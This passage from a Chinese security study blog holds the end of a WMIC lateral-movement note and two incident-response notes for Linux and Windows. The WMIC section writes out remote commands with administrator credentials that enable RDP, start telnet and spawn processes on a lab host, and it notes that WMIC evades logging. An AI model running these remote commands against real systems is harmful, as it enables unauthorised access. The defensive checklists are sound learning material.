-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
-<span id="more"></span>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p>
-<h5 id="查看工作组-域"><a href="#查看工作组-域" class="headerlink" title="查看工作组/域"></a>查看工作组/域</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic computersystem get domain</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; computersystem get domain</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p>
-<h5 id="列出进程的核心信息"><a href="#列出进程的核心信息" class="headerlink" title="列出进程的核心信息"></a>列出进程的核心信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic process list brief</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process list brief</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p>
-<h5 id="wmic开启3389端口"><a href="#wmic开启3389端口" class="headerlink" title="wmic开启3389端口"></a>wmic开启3389端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;QBY-11A2C3B9FAE&#x27; call SetAllowTSConnections 1</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &#x27;cmd.exe /c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p>
-<p>wmic开启telnet服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic SERVICE where name=&quot;tlntsvr&quot; call startservice   </span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; SERVICE where name=&quot;tlntsvr&quot; call startservice   </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/12.png"></p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/13.png"></p>
-<h5 id="获取可执行文件的路径"><a href="#获取可执行文件的路径" class="headerlink" title="获取可执行文件的路径"></a><strong>获取可执行文件的路径</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic process where name=&quot;vmtoolsd.exe&quot; get executablepath</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process where name=&quot;vmtoolsd.exe&quot; get executablepath</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p>
-<h5 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a><strong>执行程序</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地：</span><br><span class="line">wmic process call create &quot;calc&quot;</span><br><span class="line">远程：(未成功打开)</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &quot;calc&quot;</span><br><span class="line"></span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &#x27;cmd.exe /c calc&#x27;</span><br><span class="line">虽然回显了，但是那台靶机并没有弹出计算器，不晓得啥情况</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/14.png"></p>
-<p>这是两张本地验证。</p>
-<p>虽然在日志不留痕迹，但事实上如果本地有杀软还是会拦截并有弹窗提示。</p>
-<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/15.png"></p>
-<p>因此，对抗杀软也是学习安全必经之路。希望自己可以开个坑来琢磨一下~</p>
-<hr>
-<blockquote>
-<p>星光不问赶路人，时光不负有心人。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>我的内网学习之路</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网络安全应急响应Linux篇</title>
-    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/</url>
-    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
-<p>算是自己看书和学习的一个总结和整理。这里是对Linux的小总结</p>
-<p>【正在更新中,其实大部分需要掌握的基础部分写的差不多了，虽然坑没填完但也够看了】</p>
-<h1 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h1><h2 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h2><h3 id="cpu信息"><a href="#cpu信息" class="headerlink" title="cpu信息"></a>cpu信息</h3><p>【lscpu】命令可查看cpu相关信息，包括型号、主频、内核等</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/1.png"></p>
-<h3 id="操作系统信息"><a href="#操作系统信息" class="headerlink" title="操作系统信息"></a>操作系统信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/3.png"></p>
-<span id="more"></span>
-
-<h3 id="模块信息"><a href="#模块信息" class="headerlink" title="模块信息"></a>模块信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/4.png"></p>
-<h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><h3 id="查看系统所有用户信息"><a href="#查看系统所有用户信息" class="headerlink" title="查看系统所有用户信息"></a>查看系统所有用户信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd  </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/5.png"></p>
-<h3 id="分析超级权限账户"><a href="#分析超级权限账户" class="headerlink" title="分析超级权限账户"></a>分析超级权限账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;&#123;if($3==0)print $1&#125;&#x27; /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/6.png"></p>
-<h3 id="查看可登录的账户"><a href="#查看可登录的账户" class="headerlink" title="查看可登录的账户"></a>查看可登录的账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd | grep &#x27;/bin/bash&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/7.png"></p>
-<h3 id="查看用户错误的登录信息"><a href="#查看用户错误的登录信息" class="headerlink" title="查看用户错误的登录信息"></a>查看用户错误的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastb</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/8.png"></p>
-<h3 id="查看所有用户最后的登录信息"><a href="#查看所有用户最后的登录信息" class="headerlink" title="查看所有用户最后的登录信息"></a>查看所有用户最后的登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastlog | more</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/9.png"></p>
-<h3 id="查看用户最近登录信息"><a href="#查看用户最近登录信息" class="headerlink" title="查看用户最近登录信息"></a>查看用户最近登录信息</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/10.png"></p>
-<h3 id="查看当前用户登录系统情况"><a href="#查看当前用户登录系统情况" class="headerlink" title="查看当前用户登录系统情况"></a>查看当前用户登录系统情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">who</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/11.png"></p>
-<h3 id="查看空口令账户"><a href="#查看空口令账户" class="headerlink" title="查看空口令账户"></a>查看空口令账户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
-
-<h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/12.jpg"></p>
-<h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">crontab -u root -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/13.png"></p>
-<p>这条显示的命令为腾讯云的资源监控</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/14.jpg">                                    </p>
-<h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp | more #查看网络连接</span><br><span class="line"></span><br><span class="line">ls -alt /proc/【PID】#查看对应的可执行程序</span><br><span class="line"></span><br><span class="line">lsof -p PID #查看该进程打开的文件</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 PID #结束进程</span><br><span class="line"></span><br><span class="line">rm -rf filename #删除目标文件</span><br><span class="line"></span><br><span class="line">若删除不成功lsattr filename查看是否被加上i属性然后使用chattr -i filename移除i属性，在进行文件的删除</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | awk &#x27;&#123;print&#125;&#x27; | sort -n | uniq &gt; 1  #查看隐藏进程123</span><br><span class="line"></span><br><span class="line">ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">diff 1 2 #对比</span><br></pre></td></tr></table></figure>
-
-<p>可以用top查看资源占用情况，可针对性的重点排查cpu占用率较高的进程</p>
-<h1 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list  #查看系统运行的服务</span><br></pre></td></tr></table></figure>
-
-<p>等级0表示：表示关机</p>
-<p>等级1表示：单用户模式</p>
-<p>等级2表示：无网络连接的多用户命令行模式</p>
-<p>等级3表示：有网络连接的多用户命令行模式</p>
-<p>等级4表示：不可用</p>
-<p>等级5表示：带图形界面的多用户模式</p>
-<p>等级6表示：重新启动</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service --status-all  #可查看所有服务的状态</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94Linux%E7%AF%87/15.png">        </p>
-<h1 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h1><blockquote>
-<p>“我不知道怎么形容，但它一直存在”</p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>蓝队学习之路</category>
-      </categories>
-      <tags>
-        <tag>应急响应</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网络安全应急响应windows篇</title>
-    <url>/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/</url>
-    <content><![CDATA[<p>这篇笔记参考了奇安信安服团队所写的书——《网络安全应急响应技术实战指南》</p>
-<p>算是自己看书和学习的一个总结和整理。</p>
-<blockquote>
-<p>事件发生前未雨绸缪，事件发生后亡羊补牢。</p>
-</blockquote>
-<p>顺便想提一下书中在1.3中所写的一个机构、企业网络安全应急响应应具备的能力。</p>
-<p> <img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/0.jpg"></p>
-<p>这几个技能点稍加修改包装，简历不就又能加几行了吗（）</p>
-<p>常见网络安全应急响应场景：</p>
-<p>勒索病毒，挖矿木马，Webshell，网页篡改，DDoS攻击，数据泄露，流量劫持等</p>
-<p>应急响应分析流程如下：</p>
-<blockquote>
-<p>事件类型→时间范围→系统排查→进程排查→服务排查→文件痕迹检查→日志分析→(关联推理)→结论</p>
-</blockquote>
-<p>下面就是对技能点的简单总结。</p>
-<span id="more"></span>
-
-<hr>
-<h2 id="系统排查"><a href="#系统排查" class="headerlink" title="系统排查"></a>系统排查</h2><h3 id="Windows服务"><a href="#Windows服务" class="headerlink" title="Windows服务"></a>Windows服务</h3><h4 id="系统信息工具"><a href="#系统信息工具" class="headerlink" title="系统信息工具"></a>系统信息工具</h4><p>如果只是简单的了解可以通过命令行输入【systeminfo】该命令能查看主机名、操作系统版本等信息。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/1.jpg"></p>
-<p>更详细一些的内容可以通过命令行输入【winmsd】或【msinfo32】(这个是前者的更新版本)</p>
-<p>例如靶机windows2003用的就是【winmsd】命令</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/2.jpg"></p>
-<p>win10电脑是【msinfo32】命令</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/3.jpg"></p>
-<h4 id="正在运行的任务"><a href="#正在运行的任务" class="headerlink" title="正在运行的任务"></a>正在运行的任务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【正在运行任务】选项，可以查看正在运行任务的名称、状态、路径</p>
-<p>进程ID等信息。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/4.png"></p>
-<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【服务】选项，可以查看服务的名称、状态、路径等信息。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/5.jpg"></p>
-<h4 id="系统驱动服务"><a href="#系统驱动服务" class="headerlink" title="系统驱动服务"></a>系统驱动服务</h4><p>在【系统信息】窗口中，单击【软件环境】中的【系统驱动程序】选项，可以查看系统驱动程序的名称、描述、文件等信息。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/6.png"></p>
-<h4 id="加载的模块"><a href="#加载的模块" class="headerlink" title="加载的模块"></a>加载的模块</h4><p>在【系统信息】窗口中，单击【软件环境】中的【加载的模块】选项，可以查看加载的模块名称、路径等信息。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/7.png"></p>
-<h4 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h4><p>在【系统信息】窗口中，单击【软件环境】中的【启动程序】选项，可以查看启动程序命令、用户名、位置等信息。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/8.png"></p>
-<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><p>Windows系统中排查恶意账户有以下4种方法：</p>
-<h4 id="1-命令行方法【无法看到隐藏账户】"><a href="#1-命令行方法【无法看到隐藏账户】" class="headerlink" title="1.命令行方法【无法看到隐藏账户】"></a>1.命令行方法【无法看到隐藏账户】</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user   #查看用户（不包括隐藏用户）</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/9.png"></p>
-<p>进一步收集账户信息可加上username</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/10.png"></p>
-<h4 id="2-图形界面方法"><a href="#2-图形界面方法" class="headerlink" title="2.图形界面方法"></a>2.图形界面方法</h4><p>我的电脑→右键→管理→计算机管理（本地）→本地用户和组→用户</p>
-<p>或者在命令行输入【lusrmgr.msc】</p>
-<p>可以看到带$的隐藏账户</p>
-<h4 id="3-注册表方法"><a href="#3-注册表方法" class="headerlink" title="3.注册表方法"></a>3.注册表方法</h4><p>在命令行中输入【regedit】即可打开注册表编辑器</p>
-<p>选择【HKEY_LOCAL_MACHINE】下的【SAM】选项，右键点击权限界面并进入高级安全设置，更改权限然后才能看到东西，不然啥也看不到。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/11.png"></p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/12.png"></p>
-<p>双击Users文件夹可以看到对应账号F值的二进制数据（可右键导出），若发现两个账号相同 ，则发现克隆账号。</p>
-<h4 id="4-wmic方法"><a href="#4-wmic方法" class="headerlink" title="4.wmic方法"></a>4.wmic方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get name,SID</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/13.png"></p>
-<h3 id="Windows启动项"><a href="#Windows启动项" class="headerlink" title="Windows启动项"></a>Windows启动项</h3><blockquote>
-<p>启动项是病毒后门等实现持久化驻留的一种常用方法，在应急响应中也是排查的必要项目</p>
-</blockquote>
-<h4 id="1-通过【系统配置】对话框查看"><a href="#1-通过【系统配置】对话框查看" class="headerlink" title="1.通过【系统配置】对话框查看"></a>1.通过【系统配置】对话框查看</h4><p>Win+R 输入【msconfig】即可</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/14.png"></p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/15.png"></p>
-<h4 id="2-通过注册表查看"><a href="#2-通过注册表查看" class="headerlink" title="2.通过注册表查看"></a>2.通过注册表查看</h4><p>各个目录的含义看书吧 懒得打字了orz</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/16.jpg"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注册表放自启动项目录（不完全整理）</span><br><span class="line">Explorer/Run键：</span><br><span class="line">HKEY_LOCAL_MACHINE_SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer/Run</span><br><span class="line">Userinit键：</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/WindowsNT/CurrentVersion/Winlogon/Userinit</span><br><span class="line">RunServicesOnce键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunServicesOnce</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/RunServicesOnce</span><br><span class="line">RunServices键：</span><br><span class="line">KEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunServices</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/ CurrentVersion/RunServices</span><br><span class="line">Run键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</span><br><span class="line">Load键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/WindowsNT/CurrentVersion/Windows/load</span><br><span class="line">RunOnce/Setup键：</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce/Setup</span><br><span class="line">HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/RunOnceEx</span><br></pre></td></tr></table></figure>
-
-<p>添加注册表也是惯用手段了。</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/17.png"></p>
-<h3 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h3><p>不详细讲了，看图就完事儿了，这个方法还是很明显的</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/17.5.png"></p>
-<h3 id="Windows防火墙网络出入"><a href="#Windows防火墙网络出入" class="headerlink" title="Windows防火墙网络出入"></a>Windows防火墙网络出入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh Firewall show state   #查看系统防火墙状态</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/18.png"></p>
-<p>在新版虽然已被弃用，但仍可以提供所需要的信息</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/19.png"></p>
-<hr>
-<h2 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h2><h3 id="服务排查"><a href="#服务排查" class="headerlink" title="服务排查"></a>服务排查</h3><h4 id="通过【任务管理器】查看"><a href="#通过【任务管理器】查看" class="headerlink" title="通过【任务管理器】查看"></a>通过【任务管理器】查看</h4><p>实践中我发现了各版本间有写不同，比如win10在进程格右键就能选择，而2003在【查看】选项中，win7的叫法也有所不同，不过差距都不大。Windows 2003我没有发现显示映像路径和命令行设置设置，很苦恼T T</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/20.png"></p>
-<p>总之就是要看到进程名称、PID、命令行，可以初步判断哪些进程和行为可疑，方便锁定目标。</p>
-<h4 id="使用【tasklist】命令进行排查"><a href="#使用【tasklist】命令进行排查" class="headerlink" title="使用【tasklist】命令进行排查"></a>使用【tasklist】命令进行排查</h4><p>和一些参数一起食用更佳</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc  #显示每个进程和服务的对应情况</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/21.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /m</span><br></pre></td></tr></table></figure>
-
-<p>对于某些加载DLL的恶意进程可以使用</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/22.png"></p>
-<p>查找特定的DLL后跟相应的进程模块即可。tasklist命令还有过滤器功能，可以结合具体情况使用</p>
-<p><img src="/2022/06/01/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94windows%E7%AF%87/23.png"></p>
-<p>不知道有哪些功能的可以【tasklist /?】</p>
